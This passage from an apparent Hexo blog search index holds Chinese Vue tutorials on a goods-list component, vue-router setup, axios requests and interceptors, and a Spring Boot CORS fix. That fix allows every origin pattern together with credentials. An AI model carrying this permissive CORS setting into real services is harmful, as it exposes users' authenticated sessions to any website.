class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>商品描述<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">tr</span> <span class="attr">v-for</span>=<span class="string">&quot;item in goods&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.id&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.name&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123;item.intro&#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&quot;../network/request&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">name</span>: <span class="string">&quot;Goods&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">goods</span>: &#123;&#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">created</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">const</span> _this = <span class="variable language_">this</span></span></span><br><span class="line"><span class="language-javascript">      <span class="title function_">request</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">url</span>: <span class="string">&#x27;http://localhost:8181/getAllGoods&#x27;</span></span></span><br><span class="line"><span class="language-javascript">      &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        _this.<span class="property">goods</span> = res.<span class="property">data</span></span></span><br><span class="line"><span class="language-javascript">      &#125;)</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">scoped</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">table</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e9e9e9</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border-spacing</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">th</span>, <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#e9e9e9</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">text-align</span>: left;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">background-color</span>: <span class="number">#f7f7f7</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">color</span>: <span class="number">#5c6b77</span>;</span></span><br><span class="line"><span class="language-css">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">  &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="配置路由映射"><a href="#配置路由映射" class="headerlink" title="配置路由映射"></a>配置路由映射</h2><p>在router&#x2F;index.js中：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueRouter</span> <span class="keyword">from</span> <span class="string">&#x27;vue-router&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueRouter</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">path</span>: <span class="string">&#x27;/goods&#x27;</span>,</span><br><span class="line">    <span class="attr">component</span>: <span class="function">() =&gt;</span> <span class="keyword">import</span>(<span class="string">&#x27;../views/Goods&#x27;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">VueRouter</span>(&#123;</span><br><span class="line">  routes,</span><br><span class="line">  <span class="attr">mode</span>: <span class="string">&#x27;history&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> router</span><br></pre></td></tr></table></figure><h2 id="配置App-vue"><a href="#配置App-vue" class="headerlink" title="配置App.vue"></a>配置App.vue</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/goods&quot;</span>&gt;</span>商品列表<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="跨域问题"><a href="#跨域问题" class="headerlink" title="跨域问题"></a>跨域问题</h1><p>启动SpringBoot和Vue项目（<code>npm run serve</code>），访问<a href="http://localhost:8080/">http://localhost:8080/</a></p><p>点击“商品列表”，这时浏览器的控制台报错：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201117165902.png"></p><p>这是因为出现跨域问题，我们的vue项目部署在8080端口，而服务器端口是8181端口。</p><p>我们可以在后端解决跨域问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.bootvue.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CrosConfig</span> <span class="keyword">implements</span> <span class="title class_">WebMvcConfigurer</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="literal">true</span>)</span><br><span class="line">                .maxAge(<span class="number">3600</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时重新点击“商品列表”，就可以正确接收后台传输的数据并进行展示。</p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 跨域 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络模块封装</title>
      <link href="/posts/a86d/"/>
      <url>/posts/a86d/</url>
      
        <content type="html"><![CDATA[<p><code>axios中文网：</code><a href="http://www.axios-js.com/zh-cn/docs">http://www.axios-js.com/zh-cn/docs</a></p><h1 id="选择什么网络模块"><a href="#选择什么网络模块" class="headerlink" title="选择什么网络模块?"></a>选择什么网络模块?</h1><p>Vue中发送网络请求有非常多的方式，那么在开发中如何选择呢？</p><ul><li><p>传统的<strong>Ajax</strong>是基于XMLHttpRequest(XHR)。</p><ul><li>为什么不用它呢？因为它的配置和调用方式等非常混乱，编码起来看起来就非常蛋疼。</li><li>所以真实开发中很少直接使用，而是使用jQuery-Ajax。</li></ul></li><li><p>在前面的学习中，我们经常会使用<strong>jQuery-Ajax</strong>，相对于传统的Ajax非常好用。</p><ul><li>为什么不选择它呢？首先，我们先明确一点：在Vue的整个开发中都是不需要使用jQuery了。</li><li>那么,就意味着为了方便我们进行一个网络请求，特意引用一个jQuery，你觉得合理吗？</li><li>jQuery的代码1w+行，Vue的代码才1w+行。完全没有必要为了用网络请求就引用这个重量级的框架.</li></ul></li><li><p>官方在Vue1.x的时候，推出了<strong>Vue-resource</strong>。</p><ul><li>Vue-resource的体积相对于jQuery小很多。另外Vue-resource是官方推出的。</li><li>为什么不选择它呢？</li><li>在Vue2.0推出后，Vue作者就在GitHub的Issues中说明了去掉vue-resource，并且以后也不会再更新。</li><li>那么意味着以后vue-reource不再支持新的版本，也不会再继续更新和维护。对以后的项目开发和维护都存在很大的隐患。</li></ul></li><li><p>在说明不再继续更新和维护vue-resource的同时，作者还推荐了一个框架: <strong>axios</strong>。</p><ul><li>axios有非常多的优点，并且用起来也非常方便。</li></ul></li></ul><h1 id="为什么选择axios"><a href="#为什么选择axios" class="headerlink" title="为什么选择axios?"></a>为什么选择axios?</h1><p>作者推荐：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201116144403.png"></p><p>功能特点:</p><ul><li>在浏览器中发送 XMLHttpRequests 请求、</li><li>在 node.js 中发送 http请求</li><li>支持 Promise API</li><li>拦截请求和响应</li><li>转换请求和响应数据等等</li></ul><p>支持多种请求方式:</p><ul><li>axios(config)</li><li>axios.request(config)</li><li>axios.get(url[, config])</li><li>axios.delete(url[, config])</li><li>axios.head(url[, config])</li><li>axios.post(url[, data[, config]])</li><li>axios.put(url[, data[, config]])</li><li>axios.patch(url[, data[, config]])</li></ul><h1 id="发送基本请求"><a href="#发送基本请求" class="headerlink" title="发送基本请求"></a>发送基本请求</h1><p>首先安装axios：<code>npm install axios --save</code></p><p>导入axios模块：<code>import axios from ‘axios’</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 没有请求参数</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br><span class="line"></span><br><span class="line"><span class="comment">// 有请求参数</span></span><br><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/data&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br></pre></td></tr></table></figure><h1 id="发送并发请求"><a href="#发送并发请求" class="headerlink" title="发送并发请求"></a>发送并发请求</h1><p>使用axios.al，可以放入多个请求的数组。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">all</span>([<span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span></span><br><span class="line">&#125;), <span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/data&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)]).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br></pre></td></tr></table></figure><p>axios.all([]) 返回的结果是一个数组，使用 axios.spread 可将数组 [res1,res2] 展开为 res1, res2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">axios.<span class="title function_">all</span>([<span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/multidata&#x27;</span></span><br><span class="line">&#125;), <span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;http://123.207.32.32:8000/home/data&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)]).<span class="title function_">then</span>(axios.<span class="title function_">spread</span>(<span class="function">(<span class="params">res1, res2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h1 id="全局配置"><a href="#全局配置" class="headerlink" title="全局配置"></a>全局配置</h1><p>在上面的示例中，我们的BaseURL是固定的。</p><p>事实上，在开发中可能很多参数都是固定的，这个时候我们可以进行一些抽取，也可以利用axiox的全局配置。</p><p>axios.defaults.baseURL &#x3D; ‘123.207.32.32:8000’</p><p>axios.defaults.headers.post[‘Content-Type’] &#x3D; ‘application&#x2F;x-www-form-urlencoded’;</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用的都是全局axios和相应的配置</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">baseURL</span> = <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">timeout</span> = <span class="number">5000</span></span><br><span class="line"></span><br><span class="line">axios.<span class="title function_">all</span>([<span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;), <span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/home/data&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)]).<span class="title function_">then</span>(axios.<span class="title function_">spread</span>(<span class="function">(<span class="params">res1, res2</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res1)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(res2)</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure><h1 id="常见的配置选项"><a href="#常见的配置选项" class="headerlink" title="常见的配置选项"></a>常见的配置选项</h1><ul><li><p>请求地址：<code>url: &#39;/user&#39;</code></p></li><li><p>请求类型：<code>method: &#39;get&#39;</code></p></li><li><p>请根路径：<code>baseURL: &#39;http://www.mt.com/api&#39;</code></p></li><li><p>请求前的数据处理：<code>transformRequest: [function(data)&#123;&#125;]</code></p></li><li><p>请求后的数据处理：<code>transformResponse: [function(data)&#123;&#125;]</code></p></li><li><p>自定义的请求头：<code>headers: &#123;&#39;x-Requested-With&#39;:&#39;XMLHttpRequest&#39;&#125;</code></p></li><li><p>URL查询对象：<code>params: &#123; id: 12 &#125;</code></p></li><li><p>查询对象序列化函数：<code>paramsSerializer: function(params)&#123; &#125;</code></p></li><li><p>request body：<code>data: &#123; key: &#39;aa&#39;&#125;</code></p></li><li><p>超时设置s：<code>timeout: 1000</code></p></li><li><p>跨域是否带Token：<code>withCredentials: false</code></p></li><li><p>自定义请求处理：<code>adapter: function(resolve, reject, config)&#123;&#125;</code></p></li><li><p>身份验证信息：<code>auth: &#123; uname: &#39;&#39;, pwd: &#39;12&#39;&#125;</code></p></li><li><p>响应的数据格式 json &#x2F; blob &#x2F;document &#x2F;arraybuffer &#x2F; text &#x2F; stream：<code>responseType: &#39;json&#39;</code></p></li></ul><h1 id="axios的实例"><a href="#axios的实例" class="headerlink" title="axios的实例"></a>axios的实例</h1><p>为什么要创建axios的实例呢？</p><ul><li>当我们从axios模块中导入对象时，使用的实例是默认的实例，当给该实例设置一些默认配置时，这些配置就被固定下来了。</li><li>但是后续开发中，某些配置可能会不太一样，比如某些请求需要使用特定的baseURL或者timeout或者content-Type等。</li><li>这个时候，我们就可以创建新的实例，并且传入属于该实例的配置信息。</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> instance1 = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">  <span class="attr">baseURL</span>: <span class="string">&#x27;http://123.207.32.32:8000&#x27;</span>,</span><br><span class="line">  <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="title function_">instance1</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/home/multidata&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br></pre></td></tr></table></figure><h1 id="axios封装"><a href="#axios封装" class="headerlink" title="axios封装"></a>axios封装</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">  <span class="comment">// 创建axios的实例</span></span><br><span class="line">  <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;http://localhost:8181&#x27;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="comment">// 发送真正的网络请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;request&#125; <span class="keyword">from</span> <span class="string">&quot;./network/request&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">request</span>(&#123;</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;/home/data&#x27;</span>,</span><br><span class="line">  <span class="attr">params</span>: &#123;</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;pop&#x27;</span>,</span><br><span class="line">    <span class="attr">page</span>: <span class="number">1</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(res))</span><br></pre></td></tr></table></figure><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>axios提供了拦截器，用于我们在发送每次请求或者得到相应后，进行对应的处理。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">request</span>(<span class="params">config</span>) &#123;</span><br><span class="line">  <span class="comment">// 1.创建axios的实例</span></span><br><span class="line">  <span class="keyword">const</span> instance = axios.<span class="title function_">create</span>(&#123;</span><br><span class="line">    <span class="attr">baseURL</span>: <span class="string">&#x27;http://localhost:8181&#x27;</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.axios的拦截器</span></span><br><span class="line">  <span class="comment">// 2.1.请求拦截的作用</span></span><br><span class="line">  instance.<span class="property">interceptors</span>.<span class="property">request</span>.<span class="title function_">use</span>(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(config);</span></span><br><span class="line">    <span class="comment">// 1.比如config中的一些信息不符合服务器的要求</span></span><br><span class="line">    <span class="comment">// 2.比如每次发送网络请求时, 都希望在界面中显示一个请求的图标</span></span><br><span class="line">    <span class="comment">// 3.某些网络请求(比如登录(token)), 必须携带一些特殊的信息</span></span><br><span class="line">      </span><br><span class="line">    <span class="comment">// 最后记得放行config</span></span><br><span class="line">    <span class="keyword">return</span> config</span><br><span class="line">  &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.2.响应拦截</span></span><br><span class="line">  instance.<span class="property">interceptors</span>.<span class="property">response</span>.<span class="title function_">use</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// console.log(res);</span></span><br><span class="line">    <span class="keyword">return</span> res.<span class="property">data</span></span><br><span class="line">  &#125;, <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.发送真正的网络请求</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">instance</span>(config)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>请求拦截中错误拦截较少，通常都是配置相关的拦截。</li><li>可能的错误比如：请求超时，可以将页面跳转到一个错误页面中。</li><li>响应的成功拦截中，主要是对数据进行过滤。</li><li>响应的失败拦截中，可以根据status判断报错的错误码，跳转到不同的错误提示页面。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> axios </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vuex详解</title>
      <link href="/posts/19dc/"/>
      <url>/posts/19dc/</url>
      
        <content type="html"><![CDATA[<h1 id="Promise"><a href="#Promise" class="headerlink" title="Promise"></a>Promise</h1><p>Promise 对象代表了未来将要发生的事件，用来传递<strong>异步操作</strong>的消息。</p><p>在CSDN找了一篇比较不错的博客：<a href="https://blog.csdn.net/qq_34645412/article/details/81170576?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param">ES6 Promise用法小结</a></p><p>补充：缩写</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 